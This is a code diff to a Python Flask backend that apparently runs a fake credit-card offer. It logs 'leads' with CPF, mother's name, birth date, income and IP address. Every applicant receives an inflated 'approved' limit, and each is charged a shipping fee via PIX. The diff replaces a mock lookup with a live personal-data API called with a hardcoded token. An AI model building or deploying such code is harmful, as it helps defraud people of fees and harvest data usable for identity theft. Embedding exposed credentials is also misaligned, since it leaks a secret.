@@ -142,6 +142,7 @@ def init_db():
             data_nasc       TEXT,
             renda           TEXT,
             tipo_renda      TEXT,
+            motivo_credito  TEXT,
             dia_vencimento  TEXT,
             whatsapp        TEXT,
             card_color      TEXT,
@@ -264,26 +265,54 @@ def format_cpf(cpf: str) -> str:
     cpf = re.sub(r"\D", "", cpf)
     return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
 
-def calc_limite(renda_raw: str) -> dict:
+def calc_limite(renda_raw: str, tipo_renda: str = "", motivo: str = "") -> dict:
     """
     Determina o limite de crédito aprovado e o valor do frete
-    com base na renda declarada pelo lead.
+    com base na renda, profissão e motivo do crédito declarados.
     """
     try:
         v = float(re.sub(r"[^\d,\.]", "", renda_raw).replace(",", "."))
     except Exception:
         v = 0.0
 
+    # Limite Base
     if v >= 15000:
-        return {"limite": "R$ 18.000,00", "frete": 49.90, "tier": "platinum"}
+        base_limite = 18000.0
+        tier = "platinum"
     elif v >= 8000:
-        return {"limite": "R$ 12.000,00", "frete": 39.90, "tier": "gold"}
+        base_limite = 12000.0
+        tier = "gold"
     elif v >= 4000:
-        return {"limite": "R$  8.000,00", "frete": 29.90, "tier": "gold"}
+        base_limite = 8000.0
+        tier = "gold"
     elif v >= 2000:
-        return {"limite": "R$  4.500,00", "frete": 19.90, "tier": "standard"}
+        base_limite = 4500.0
+        tier = "standard"
     else:
-        return {"limite": "R$  2.000,00", "frete": 19.90, "tier": "standard"}
+        base_limite = 2000.0
+        tier = "standard"
+
+    # Multiplicadores Avançados
+    if "CLT" in tipo_renda or "Formal" in tipo_renda:
+        base_limite *= 1.15
+    elif "Autônomo" in tipo_renda or "Empresário" in tipo_renda:
+        base_limite *= 1.25
+
+    if "Negócio" in motivo or "Empresa" in motivo:
+        base_limite *= 1.20
+    elif "Imóvel" in motivo or "Casa" in motivo or "Carro" in motivo:
+        base_limite *= 1.10
+
+    # Pega valor fixo do frete via variável de ambiente, se existir
+    frete_env = os.environ.get("FRETE_VALOR")
+    if frete_env:
+        frete = float(frete_env)
+    else:
+        # Padrão original
+        frete = 49.90 if tier == "platinum" else (39.90 if v >= 8000 else (29.90 if v >= 4000 else 19.90))
+
+    limite_str = f"R$ {base_limite:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
+    return {"limite": limite_str, "frete": frete, "tier": tier}
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  CPF LOOKUP (mock — em produção integrar com API Intel / Serasa)
@@ -301,26 +330,28 @@ _CPF_SEED: Dict[str, dict] = {
     },
 }
 
-def lookup_cpf(cpf_raw: str) -> Optional[dict]:
+def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
     cpf = re.sub(r"\D", "", cpf_raw)
-    if cpf in _CPF_SEED:
-        return _CPF_SEED[cpf]
-    # Geração determinística para demonstração
-    fns = ["ANA", "CARLOS", "MARIA", "PEDRO", "JULIANA", "ROBERTO", "FERNANDA", "MARCOS"]
-    lns = ["SILVA", "SOUZA", "OLIVEIRA", "SANTOS", "LIMA", "COSTA", "FERREIRA", "GOMES"]
-    s   = sum(int(c) for c in cpf) % len(fns)
-    nome = f"{fns[s]} {lns[(s+3)%8]} {lns[(s+1)%8]}"
-    sm   = (s + 2) % len(fns)
-    mns  = ["ROSA", "CLARA", "LUCIA", "MARIA", "ANA", "BEATRIZ", "HELOISA", "RITA"]
-    mae  = f"{mns[sm % len(mns)]} {lns[(sm+1)%8]}"
-    day  = (int(cpf[0]) % 28) + 1
-    mon  = (int(cpf[1]) % 12) + 1
-    year = 1965 + (int(cpf[2:4]) % 35)
-    return {
-        "nome":      nome,
-        "nome_mae":  mae,
-        "data_nasc": f"{day:02d}/{mon:02d}/{year}",
-    }
+    
+    # Hub do Desenvolvedor API
+    if cpf and data_nasc:
+        try:
+            import requests
+            token = "219648175aXyEcieuSW396568120"
+            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={cpf}&data={data_nasc}&token={token}"
+            res = requests.get(url, timeout=10)
+            data = res.json()
+            if data.get("status"):
+                res_info = data.get("result", {})
+                return {
+                    "nome": res_info.get("nome_da_pf", "NÃO INFORMADO"),
+                    "nome_mae": res_info.get("nome_mae", "NÃO INFORMADA"),
+                    "data_nasc": res_info.get("data_nascimento", data_nasc),
+                    "saldo_api": data.get("saldo", 0)
+                }
+        except Exception as e:
+            log.error(f"Erro na API de CPF: {e}")
+    return None
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  C7 PIX — Geração de cobrança via QR Code / Copia e Cola
@@ -506,16 +537,23 @@ def slug_page(slug):
 # ── 1. Consulta CPF ───────────────────────────────────────────────────────────
 @app.route("/api/cpf", methods=["POST"])
 def api_cpf():
-    data    = get_secure_json()
-    cpf_raw = sanitize(data.get("cpf", ""), 14)
-    cpf     = re.sub(r"\D", "", cpf_raw)
+    data      = get_secure_json()
+    cpf_raw   = sanitize(data.get("cpf", ""), 14)
+    data_nasc = sanitize(data.get("data_nasc", ""), 10)
+    cpf       = re.sub(r"\D", "", cpf_raw)
 
     if not validate_cpf(cpf):
         return jsonify({"ok": False, "error": "CPF inválido. Verifique o número e tente novamente."}), 422
+    if not data_nasc:
+        return jsonify({"ok": False, "error": "Data de Nascimento é obrigatória."}), 400
 
-    info = lookup_cpf(cpf)
+    info = lookup_cpf(cpf, data_nasc)
     if not info:
-        return jsonify({"ok": False, "error": "CPF não localizado em nossa base de dados."}), 404
+        return jsonify({"ok": False, "error": "CPF não localizado em nossa base de dados com a Data de Nascimento informada."}), 404
+        
+    saldo = info.get("saldo_api", 0)
+    if saldo > 0 and saldo < 100:
+        log.warning(f"[API_CREDITOS] ALERTA: Saldo da API de CPF acabando! Restam: {saldo}")
 
     return jsonify({
         "ok":       True,
@@ -538,13 +576,14 @@ def api_lead():
 
     renda         = sanitize(data.get("renda", ""), 30)
     tipo_renda    = sanitize(data.get("tipo_renda", ""), 60)
+    motivo        = sanitize(data.get("motivo_credito", ""), 100)
     dia_venc      = sanitize(data.get("dia_vencimento", ""), 4)
     nome          = sanitize(data.get("nome", ""), 120)
     nome_mae      = sanitize(data.get("nome_mae", ""), 120)
     data_nasc     = sanitize(data.get("data_nasc", ""), 12)
 
-    # Calcula limite com base na renda
-    analise       = calc_limite(renda)
+    # Calcula limite avançado
+    analise       = calc_limite(renda, tipo_renda, motivo)
     limite        = analise["limite"]
     frete         = analise["frete"]
 
@@ -553,16 +592,16 @@ def api_lead():
     if existing:
         db.execute("""
             UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
-                renda=?, tipo_renda=?, dia_vencimento=?, limite_aprovado=?,
+                renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
                 updated_at=unixepoch()
             WHERE session_id=?
-        """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, dia_venc, limite, sid))
+        """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, sid))
     else:
         db.execute("""
             INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
-                renda,tipo_renda,dia_vencimento,limite_aprovado)
-            VALUES(?,?,?,?,?,?,?,?,?,?)
-        """, (sid, _ip(), cpf, nome, nome_mae, data_nasc, renda, tipo_renda, dia_venc, limite))
+                renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado)
+            VALUES(?,?,?,?,?,?,?,?,?,?,?)
+        """, (sid, _ip(), cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite))
     db.commit()
 
     return jsonify({
